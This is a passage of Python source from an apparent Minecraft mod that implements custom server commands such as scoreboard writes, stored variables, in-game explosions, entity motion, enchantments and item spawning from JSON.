			return True, '没有与选择器匹配的目标'
		objects = compGame.GetAllScoreboardObjects()
		scoreboard_name = cmdargs[1]
		if not any(obj['name'] == scoreboard_name for obj in objects):
			return True, '未找到该计分板对象'
		for entity in cmdargs[0]:
			hunger = CF.CreateAttr(entity).GetAttrValue(4)
			hunger = int(round(hunger))
			compCmd.SetCommand('/scoreboard players set @s %s %s' % (scoreboard_name, hunger), entity, False)
		return False, '已将 %s 个实体的饥饿值写入计分板 %s' % (len(cmdargs[0]), scoreboard_name)

	def writearmortoscoreboard(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		objects = compGame.GetAllScoreboardObjects()
		scoreboard_name = cmdargs[1]
		if not any(obj['name'] == scoreboard_name for obj in objects):
			return True, '未找到该计分板对象'
		for entity in cmdargs[0]:
			armor = CF.CreateAttr(entity).GetAttrValue(12)
			armor = int(round(armor))
			compCmd.SetCommand('/scoreboard players set @s %s %s' % (scoreboard_name, armor), entity, False)
		return False, '已将 %s 个实体的盔甲值写入计分板 %s' % (len(cmdargs[0]), scoreboard_name)
	
	def writespeedtoscoreboard(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		objects = compGame.GetAllScoreboardObjects()
		scoreboard_name = cmdargs[1]
		if not any(obj['name'] == scoreboard_name for obj in objects):
			return True, '未找到该计分板对象'
		for entity in cmdargs[0]:
			speed = CF.CreateActorMotion(entity).GetMotion()
			speed = (speed[0]**2 + speed[1]**2 + speed[2]**2)**0.5  # 计算速度
			speed = int(round(speed*20))
			compCmd.SetCommand('/scoreboard players set @s %s %s' % (scoreboard_name, speed), entity, False)
		return False, '已将 %s 个实体的速度值写入计分板 %s' % (len(cmdargs[0]), scoreboard_name)
	
	def executecb(self, cmdargs, playerId, variant, data):
		xyz = (intg(cmdargs[0][0]), int(cmdargs[0][1]), intg(cmdargs[0][2]))
		success = compBlockEntity.ExecuteCommandBlock(xyz, cmdargs[1]['id'])
		if success:
			return False, '已执行位于 Pos%s in %s 的命令方块' % (xyz, cmdargs[1]['name'])
		else:
			return True, '位于 Pos%s in %s 的方块不是命令方块' % (xyz, cmdargs[1]['name'])
		
	def setname(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateName(i).SetName(cmdargs[1])
		return False, '已设置 %s 个实体的名称为 %s' % (len(cmdargs[0]), cmdargs[1])
	
	def aicontrol(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateControlAi(i).SetBlockControlAi(cmdargs[1], cmdargs[2])
		return False, '已%s %s 个实体的AI' % ('启用' if cmdargs[1] else '禁用', len(cmdargs[0]))

	def param(self, cmdargs, playerId, variant, data):
		params = compExtra.GetExtraData('parameters')
		
		# 兼容旧版本
		if type(params) is dict:
			need_upgrade = False
			for key, value in params.items():
				if not isinstance(value, dict):
					if value.replace('.', '', 1).isdigit():
						params[key] = {'type': 'float', 'value': value} if '.' in value else {'type': 'int', 'value': value}
					else:
						params[key] = {'type': 'str', 'value': value}
					need_upgrade = True
			
			if need_upgrade:
				compExtra.SetExtraData('parameters', params)
		
		if variant == 0:  # show
			if cmdargs[1] is None:
				output = ['当前存储的变量:']
				if params and type(params) is dict:
					for key, value_info in params.items():
						output.append(' - %s (%s): %s' % (key, value_info.get('type', 'unknown'), value_info.get('value', '')))
				return False, '\n'.join(output)
			else:
				if type(params) == dict and params.get(cmdargs[1]) is not None:
					var_info = params[cmdargs[1]]
					return False, '变量 %s [%s] = %s' % (cmdargs[1], var_info.get('type', 'unknown'), var_info.get('value', ''))
				else:
					return True, '未知的变量 %s' % cmdargs[1]
					
		elif variant == 2:  # del
			if type(params) == dict and params.get(cmdargs[1]):
				del params[cmdargs[1]]
				compExtra.SetExtraData('parameters', params)
				return False, '已删除变量 %s' % cmdargs[1]
			else:
				return True, '未知的变量 %s ' % cmdargs[1]
		
		elif variant == 3:  # operation
			if not (type(params) == dict and params.get(cmdargs[1])):
				return True, '未知的变量 %s ' % cmdargs[1]	
			var_info = params[cmdargs[1]]
			var_type = var_info['type']
			current_value = var_info['value']
			
			if cmdargs[3].replace('.', '', 1).isdigit():
				if cmdargs[3].find('.') != -1:
					operand_value = float(cmdargs[3])
				else:
					operand_value = int(cmdargs[3])
			else:
				operand_value = cmdargs[3]
					
			if cmdargs[2] == '加':
				if isinstance(operand_value, (int, float)) and isinstance(current_value, (int, float)):
					result = current_value + operand_value
				else:
					result = str(current_value) + str(operand_value)
				
			elif cmdargs[2] == '乘':
				if isinstance(operand_value, (int, float)) and isinstance(current_value, (int, float)):
					result = current_value * operand_value
				else:
					if isinstance(operand_value, int) and isinstance(current_value, str):
						result = current_value * operand_value
					elif isinstance(operand_value, str) and isinstance(current_value, int):
						result = operand_value * current_value
					else:
						return True, '仅支持整数与字符串的乘法'
			
			elif var_type in ['int', 'float'] and isinstance(operand_value, (int, float)):
				if cmdargs[2] == '减':
					result = current_value - operand_value
				elif cmdargs[2] == '除':
					if operand_value == 0:
						return True, '除数不能为零'
					result = current_value / operand_value
				elif cmdargs[2] == '乘方':
					result = current_value ** operand_value
				elif cmdargs[2] == '取余':
					if operand_value == 0:
						return True, '取余操作数不能为零'
					result = current_value % operand_value
				elif cmdargs[2] == '整除':
					if operand_value == 0:
						return True, '除数不能为零'
					result = current_value // operand_value

			else:
				return True, '字符串不支持该操作'
			
			# 更新结果并转换类型
			if isinstance(result, int):
				var_newtype = 'int'
			elif isinstance(result, float):
				var_newtype = 'float'
			else:
				var_newtype = 'str'
		
			params[cmdargs[1]]['type'] = var_newtype
			params[cmdargs[1]]['value'] = result
			compExtra.SetExtraData('parameters', params)
			return False, '操作完成: 结果 %s' % result
		
		elif variant == 4:  # random
			if not type(params) == dict:
				params = {}
			
			params[cmdargs[1]] = {
				'type': 'int',
				'value': random.randint(cmdargs[2], cmdargs[3])
			}
			compExtra.SetExtraData('parameters', params)
			return False, '已将 %s 设置为随机值 %s' % (cmdargs[1], params[cmdargs[1]]['value'])
		
		elif variant == 1:  # set 
			if not type(params) == dict:
				params = {}
			
			if cmdargs[3] is not None:
				try:
					if cmdargs[2] == 'int':
						value = int(cmdargs[3])
					elif cmdargs[2] == 'float':
						value = float(cmdargs[3])
					else:  # str
						value = str(cmdargs[3])
				except:
					return True, '%s 无法转换为 %s 类型' % (cmdargs[3], cmdargs[2])
			else:
				value = 0 if cmdargs[2] == 'int' else 0.0 if cmdargs[2] == 'float' else ''
			
			params[cmdargs[1]] = {
				'type': cmdargs[2],
				'value': value
			}
			
			compExtra.SetExtraData('parameters', params)
			return False, '已修改 %s 类型变量 %s = %s' % (cmdargs[2], cmdargs[1], value)	

	def kickt(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for kickplayer in cmdargs[0]:
			compCmd.SetCommand('/kick "%s" "%s"' % (CF.CreateName(kickplayer).GetName(), cmdargs[1]))
		return False, '已将 %s 踢出游戏: %s' % (create_players_str(cmdargs[0]), cmdargs[1])
			
	def explode(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[4] is None:
			return True, '没有与选择器匹配的目标'
		if isinstance(cmdargs[4], tuple):
			if len(cmdargs[4]) != 1:
				return True, '只允许一个实体, 但提供的选择器允许多个实体'
			cmdargs[4] = cmdargs[4][0]
		ExpPlayerId = serverApi.GetPlayerList()
		ExpPlayerId = ExpPlayerId[random.randint(0, len(ExpPlayerId)-1)]
		for i in cmdargs[0]:
			position = CF.CreatePos(i).GetFootPos()
			CF.CreateExplosion(levelId).CreateExplosion(position, cmdargs[1], cmdargs[3], cmdargs[2], cmdargs[4], ExpPlayerId)
		return False, '已引爆 %s 个实体' % len(cmdargs[0])

	def explodebypos(self, cmdargs, playerId, variant, data):
		if cmdargs[4] is None:
			return True, '没有与选择器匹配的目标'
		if isinstance(cmdargs[4], tuple):
			if len(cmdargs[4]) != 1:
				return True, '只允许一个实体, 但提供的选择器允许多个实体'
			cmdargs[4] = cmdargs[4][0]
		ExpPlayerId = serverApi.GetPlayerList()
		ExpPlayerId = ExpPlayerId[random.randint(0, len(ExpPlayerId)-1)]
		if CF.CreateExplosion(levelId).CreateExplosion(cmdargs[0], cmdargs[1], cmdargs[3], cmdargs[2], cmdargs[4], ExpPlayerId):
			return False, '爆炸已创建于 Pos%s' % (cmdargs[0],)
		else:
			return True, '爆炸创建失败'

	def console(self, cmdargs, playerId, variant, data): #there are lots of ****
		if cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		cmdargs[1] = None if cmdargs[1] == 'no' else cmdargs[1]
		if cmdargs[1] and len(cmdargs[1]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		cmd = cmdargs[0]
		if cmd.startswith('/'):
			cmd = cmd[1:]
		params = compExtra.GetExtraData('parameters')
		cmd2 = ''
		if params and isinstance(params, dict):
				if '{' in cmd and '}' in cmd:
					words = re.findall(r'\{(.*?)\}', cmd)
					for word in words:
						if params.get(word) is None:
							value = '{%s}' % word
						else:
							param = params[word]
							value = param.get('value', '')
						cmd2 = cmd.replace('{%s}' % word, str(value))
		
		if not cmd2:
			cmd2 = cmd
		
		final_cmd = cmd2.replace("'", '"')
		compCmd.SetCommand(final_cmd, cmdargs[1][0], cmdargs[2])
		return False, '已将指令处理后执行: %s' % final_cmd
	
	def addaroundentitymotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		if len(cmdargs[1]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				addMotion = CompMotion.AddPlayerAroundEntityMotion
			else:
				addMotion = CompMotion.AddEntityAroundEntityMotion
			Mid = addMotion(cmdargs[1][0],
							cmdargs[2],
							cmdargs[3],
							cmdargs[4],
							cmdargs[5],
							cmdargs[6])
			if Mid != -1:
				tot += 1
		if tot:
			return False, '已设置 %s 个实体的运动器' % tot
		else:
			return True, '设置失败'
	
	def addaroundpointmotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				addMotion = CompMotion.AddPlayerAroundPointMotion
			else:
				addMotion = CompMotion.AddEntityAroundPointMotion
			Mid = addMotion(cmdargs[1],
							cmdargs[2],
							cmdargs[3],
							cmdargs[4],
							cmdargs[5])
			if Mid != -1:
				tot += 1
		if tot:
			return False, '已设置 %s 个实体的运动器' % tot
		else:
			return True, '设置失败'

	def addvelocitymotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				addMotion = CompMotion.AddPlayerVelocityMotion
			else:
				addMotion = CompMotion.AddEntityVelocityMotion
			Mid = addMotion(cmdargs[1],
							cmdargs[2],
							cmdargs[3])
			if Mid != -1:
				tot += 1
		if tot:
			return False, '已设置 %s 个实体的运动器' % tot
		else:
			return True, '设置失败'
	
	def startmotion(self, cmdargs, playerId, variant, data):

		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			#旧数据处理
			compExtra = CF.CreateExtraData(i)
			compExtra.CleanExtraData('Motions')
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				startMotion = CompMotion.StartPlayerMotion
				Motions = CompMotion.GetPlayerMotions()
			else:
				startMotion = CompMotion.StartEntityMotion
				Motions = CompMotion.GetEntityMotions()
			for k,_ in Motions.items():
				startMotion(k)
			if Motions:
				tot += 1
		if tot:
			return False, '已启用 %s 个实体的运动器' % tot
		else:
			return True, '实体没有绑定运动器'
	
	def stopmotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				stopMotion = CompMotion.StopPlayerMotion
				Motions = CompMotion.GetPlayerMotions()
			else:
				stopMotion = CompMotion.StopEntityMotion
				Motions = CompMotion.GetEntityMotions()
			for k,_ in Motions.items():
				stopMotion(k)
			if Motions:
				tot += 1
		if tot:
			return False, '已暂停 %s 个实体的运动器' % tot
		else:
			return True, '实体没有绑定运动器'
	
	def removemotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				Motions = CompMotion.GetPlayerMotions()
				removeMotion = CompMotion.RemovePlayerMotion
			else:
				Motions = CompMotion.GetEntityMotions()
				removeMotion = CompMotion.RemoveEntityMotion
			for k,_ in Motions.items():
				removeMotion(k)
			if Motions:
				tot += 1
		if tot:
			return False, '已移除 %s 个实体的运动器' % tot
		else:
			return True, '实体没有绑定运动器'

	def addenchant(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if isinstance(cmdargs[3], int):
			slotType = 0
			slot = cmdargs[3]
		else:
			slotType = 2
			slot = 0
		for i in cmdargs[0]:
			itemdict = CF.CreateItem(i).GetPlayerItem(slotType, slot, True)
			if itemdict:
				if itemdict['userData'] is None:
					itemdict['userData'] = {}
				if itemdict['userData'].get('ench', None) is None:
					itemdict['userData']['ench'] = []
				
				itemdict['userData']['ench'].insert(0, {
					'lvl': {'__type__': 2, '__value__': cmdargs[2]},
					'id':  {'__type__': 2, '__value__': cmdargs[1]['type']},
					'modEnchant': {'__type__': 8, '__value__': ''}
				})
				itemdict['enchantData'] = []
				
				if slotType == 0:
					CF.CreateItem(i).SpawnItemToPlayerInv(itemdict, i, slot)
				else:
					CF.CreateItem(i).SpawnItemToPlayerCarried(itemdict, i)
		return False, '已为 %s 的%s物品添加附魔 %s' % (create_players_str(cmdargs[0]), '手持' if slotType == 2 else '背包', cmdargs[1]['identifier'])

	def addtrackmotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		tot = 0
		for i in cmdargs[0]:
			CompMotion = CF.CreateActorMotion(i)
			CompType = CF.CreateEngineType(i)
			EntityType = CompType.GetEngineTypeStr()
			if EntityType == 'minecraft:player':
				addMotion = CompMotion.AddPlayerTrackMotion
			else:
				addMotion = CompMotion.AddEntityTrackMotion
			Mid = addMotion(cmdargs[1],
							cmdargs[2],
							None,
							False,
							cmdargs[3],
							None,
							None,
							cmdargs[4])
			if Mid != -1:
				tot += 1
			#Motions = compExtra.GetExtraData('Motions')
			#if not Motions:
			#	Motions = []
			#Motions.append(Mid)
			#compExtra.SetExtraData('Motions', Motions)
		if tot:
			return False, '已设置 %s 个实体的运动器' % tot
		else:
			return True, '设置失败'

	def setactorcanburnbylightning(self, cmdargs, playerId, variant, data):
		compGame.SetCanActorSetOnFireByLightning(cmdargs[0])
		return False, '已 %s 实体被闪电点燃' % ('允许' if cmdargs[1] else '禁止')

	def setblockcanburnbylightning(self, cmdargs, playerId, variant, data):
		compGame.SetCanBlockSetOnFireByLightning(cmdargs[0])
		return False, '已 %s 方块被闪电点燃' % ('允许' if cmdargs[1] else '禁止')

	def cancelshearsdestoryblockspeedall(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			compItem = CF.CreateItem(i)
			compItem.CancelShearsDestoryBlockSpeedAll()
		return False, '已取消 %s 个实体剪刀破坏方块速度的所有设置' % (len(cmdargs[0]))

	def cancelshearsdestoryblockspeed(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			compItem = CF.CreateItem(i)
			compItem.CancelShearsDestoryBlockSpeed(cmdargs[1])
			#	return True, '无效的命名空间id'
		return False, '已取消 %s 个实体剪刀破坏 %s 速度的设置' % (len(cmdargs[0]), cmdargs[1])

	def setshearsdestoryblockspeed(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[2] < 1:
			return True, '速度必须大于1'
		for i in cmdargs[0]:
			compItem = CF.CreateItem(i)
			compItem.SetShearsDestoryBlockSpeed(cmdargs[1], cmdargs[2])
			#	return True, '无效的命名空间id'
		return False, '已设置 %s 个实体剪刀破坏 %s 速度为 %s' % (len(cmdargs[0]), cmdargs[1], cmdargs[2])

	def changeselectslot(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CompType = CF.CreateEngineType(i)
			if CompType.GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CompPlayer = CF.CreatePlayer(i)
			CompPlayer.ChangeSelectSlot(cmdargs[1])
		return False, '将 %s 的选择槽位设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def forbidliquidflow(self, cmdargs, playerId, variant, data):
		compGame.ForbidLiquidFlow(cmdargs[0])
		return False, '已 %s 液体流动' % ('禁止' if cmdargs[0] else '允许')

	def getuid(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		uid_dict = {}
		for i in cmdargs[0]:
			CompType = CF.CreateEngineType(i)
			if CompType.GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			playername = CF.CreateName(i).GetName()
			uid_dict[playername] = CF.CreateHttp(levelId).GetPlayerUid(i)
		return False, '获取到的UID为%s' % (uid_dict)
		# self.NotifyToMultiClients(list(cmdargs[0]), 'CustomCommandClient', {'cmd':'getuid', 'origin': playerId})

	def givewithnbt(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		result = checkjson(cmdargs[1])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if isinstance(itemDict, dict):
			for i in ['isDiggerItem', 'enchantData', 'itemId', 'modEnchantData', 'modId', 'modItemId', 'itemName', 'auxValue']:
				itemDict.pop(i, False) #删去多余键值对(这些已被弃用)
			if itemDict.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if itemDict.get('count') is None:
				return True, '物品数据中缺少 count 键'
			for i in cmdargs[0]:
				if not CF.CreateItem(i).SpawnItemToPlayerInv(itemDict, i):
					return True, '此JSON生成物品失败'
			return False, '成功给予 %s 物品 %s * %s' % (create_players_str(cmdargs[0]), itemDict.get('newItemName'), itemDict.get('count'))
		else:
			return True, '无效的nbt'
		
	def spawnitemtocontainer(self, cmdargs, playerId, variant, data):
		# args['return_msg_key'] = '给予失败'
		# args['return_failed'] = True
		x = intg(cmdargs[2][0])
		y = int(cmdargs[2][1])
		z = intg(cmdargs[2][2])
		itemDict = compItemWorld.GetContainerItem((x, y, z), cmdargs[1], cmdargs[3]['id'], True)
		result = checkjson(cmdargs[0])
		if result[1] == True:
			return True, result[0]
		itemDict2 = result[0]
		if isinstance(itemDict2, dict):
			for k,v in [('durability', 0), ('customTips', ''), ('extraId', ''), ('newAuxValue', 0), ('userData', None), ('showInHand', True)]:
				itemDict2.setdefault(k, v)
			if itemDict is not None:
				for i in ['isDiggerItem', 'enchantData', 'itemId', 'modEnchantData', 'modId', 'modItemId', 'itemName', 'auxValue']:
					itemDict.pop(i) #删去多余键值对(这些已被弃用)
					itemDict2.pop(i, False)
				countOrign = itemDict.pop('count')
			else: countOrign = 0
			countAdd = itemDict2.pop('count', 1)
			if itemDict2.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if ((itemDict is None) or itemDict == itemDict2) and countOrign+countAdd <= 64:
				itemDict2.update({'count': countOrign+countAdd})
				if compItemWorld.SpawnItemToContainer(itemDict2, cmdargs[1], (x, y, z), cmdargs[3]['id']):
					return False, '向槽位 %s 添加 %s * %s' % (cmdargs[1], itemDict2.get('newItemName'), countAdd)
				else:
					return True, '位于 Pos(%s,%s,%s) 的方块不是容器' % (x,y,z)
			else:
				return True, '槽位已满'
		else:
			return True, '无效的nbt'

	def spawnitemtoenderchest(self, cmdargs, playerId, variant, data):
		# args['return_msg_key'] = '给予失败'
		# args['return_failed'] = True
		for player in cmdargs[2]:
			if CF.CreateEngineType(player).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		result = checkjson(cmdargs[0])
		if result[1] == True:
			return True, result[0]
		itemDict2 = result[0]
		if isinstance(itemDict2, dict):
			for k,v in [('durability', 0), ('customTips', ''), ('extraId', ''), ('newAuxValue', 0), ('userData', None), ('showInHand', True)]:
				itemDict2.setdefault(k, v)
			countAdd = itemDict2.pop('count', 1)
			for player in cmdargs[2]:
				compItem = CF.CreateItem(player)
				itemDict = compItem.GetEnderChestItem(player, cmdargs[1], True)
				if itemDict:
					for i in ['isDiggerItem', 'enchantData', 'itemId', 'modEnchantData', 'modId', 'modItemId', 'itemName', 'auxValue']:
						itemDict.pop(i) #删去多余键值对(这些已被弃用)
						itemDict2.pop(i, False)
					countOrign = itemDict.pop('count')
				else: countOrign = 0
				if itemDict2.get('newItemName') is None:
					return True, '物品数据中缺少 newItemName 键'
				if ((not itemDict) or itemDict == itemDict2) and countOrign+countAdd <= 64:
					itemDict2.update({'count': countOrign+countAdd})
					if compItem.SpawnItemToEnderChest(itemDict2, cmdargs[1]):
						return False, '向 %s 的末影箱中的槽位 %s 添加 %s * %s' % (create_players_str(cmdargs[2]), cmdargs[1], itemDict2.get('newItemName'), countAdd)
				else:
					return True, '槽位已满'
		else:
			return True, '无效的nbt'

	def replaceitemtocarried(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		result = checkjson(cmdargs[1])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if isinstance(itemDict, dict):
			if itemDict.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if itemDict.get('count') is None:
				return True, '物品数据中缺少 count 键'
			for i in cmdargs[0]:
				CF.CreateItem(i).SpawnItemToPlayerCarried(itemDict, i)
			return False, '将 %s 的主手物品替换为 %s * %s' % (create_players_str(cmdargs[0]), itemDict.get('newItemName'), itemDict.get('count'))
		else:
			return True, '无效的nbt'

	def removeenchant(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[2] is None:
			posType = 2
			pos = 0
		else:
			posType = 0
			pos = cmdargs[2]
		for i in cmdargs[0]:
			compItem = CF.CreateItem(i)
			itemDict = compItem.GetPlayerItem(posType, pos, True)
			if itemDict:
				if itemDict.get('userData') is not None:
					if itemDict['userData'].get('ench') is not None:
						for ii in itemDict['userData']['ench']:
							if ii['id']['__value__'] == cmdargs[1]['type']:
								itemDict['userData']['ench'].remove(ii)
						if itemDict['userData']['ench'] == []:
							del itemDict['userData']['ench']
				del itemDict['enchantData']
				if posType == 0:
					compItem.SpawnItemToPlayerInv(itemDict, i, pos)
				else:
					compItem.SpawnItemToPlayerCarried(itemDict, i)
		return False, '将 %s 背包物品中的 %s 附魔移除' % (create_players_str(cmdargs[0]), cmdargs[1]['identifier'])

	def resetmotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CompType = CF.CreateEngineType(i)
			CompMotion = CF.CreateActorMotion(i)
			if CompType.GetEngineTypeStr() == 'minecraft:player':
				CompMotion.SetPlayerMotion((0, 0, 0))
			else:
				CompMotion.ResetMotion()
		return False, '已重置 %s 个实体的运动状态' % len(cmdargs[0])

	def setleashholder(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if len(cmdargs[0]) == 1:
			for i in cmdargs[1]:
				compEntityD = CF.CreateEntityDefinitions(i)
				compEntityD.SetLeashHolder(cmdargs[0])
			return False, '已尝试拴住实体'
		else:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'

	def setlootdropped(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			compEntityD = CF.CreateEntityDefinitions(i)
			compEntityD.SetLootDropped(cmdargs[1])
		return False, '将 %s 个实体的掉落概率设置为 %s' % (len(cmdargs[0]), cmdargs[1])

	def setmaxairsupply(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			compBrea = CF.CreateBreath(i)
			compBrea.SetMaxAirSupply(cmdargs[1])
		return False, '将 %s 个实体的最大氧气量设置为 %s' % (len(cmdargs[0]), cmdargs[1])

	def knockback(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateAction(i).SetMobKnockback(cmdargs[1], cmdargs[2], cmdargs[3], cmdargs[4], cmdargs[5])
		return False, '已击飞 %s 个实体' % (len(cmdargs[0]))

	def setmotion(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CompType = CF.CreateEngineType(i)
			CompMotion = CF.CreateActorMotion(i)
			if CompType.GetEngineTypeStr() == 'minecraft:player':
				CompMotion.SetPlayerMotion(cmdargs[1])
			else:
				CompMotion.SetMotion(cmdargs[1])
		return False, '将 %s 个实体的动量设置为 %s' % (len(cmdargs[0]), str(cmdargs[1]))

	def setopencontainersability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetOpenContainersAbility(cmdargs[1])
		return False, '将 %s 的开箱权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setoperatedoorability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetOperateDoorsAndSwitchesAbility(cmdargs[1])
		return False, '将 %s 的开门权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')

	def setorbexperience(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:xp_orb':
				return True, '选择器必须为经验球类型'
		for i in cmdargs[0]:
			compAttr = CF.CreateExp(i)
			compAttr.SetOrbExperience(cmdargs[1])
		return False, '将 %s 个经验球的经验值设置为 %s' % (len(cmdargs[0]), cmdargs[1])

	def setpersistent(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			compAttr = CF.CreateAttr(i)
			compAttr.SetPersistent(cmdargs[1])
		return False, '将 %s 个实体的自动清除设置为 %s' % (len(cmdargs[0]), '允许' if cmdargs[1] else '禁止')

	def setpistonmaxinteractioncount(self, cmdargs, playerId, variant, data):
		if compGame.SetPistonMaxInteractionCount(cmdargs[0]):
			return False, '将活塞最大推动数设置为 %s' % cmdargs[0]
		else:
			return True, '无效的数值'

	def setplayeruiitem(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		result = checkjson(cmdargs[2])
		if result[1] == True:
			return True, result[0]
		itemDict = result[0]
		if isinstance(itemDict, dict):
			if itemDict.get('newItemName') is None:
				return True, '物品数据中缺少 newItemName 键'
			if itemDict.get('count') is None:
				return True, '物品数据中缺少 count 键'
			enum = {
					"cursorselected" : 0,
					"anvilinput" : 1,
					"anvilmaterial" : 2,
					"stonecutterinput" : 3,
					"trade2ingredient1" : 4,
					"trade2ingredient2" : 5,
					"loominput" : 9,
					"loomdye" : 10,
					"loommaterial" : 11,
					"cartographyinput" : 12,
					"cartographyadditional" : 13,
					"enchantinginput" : 14,
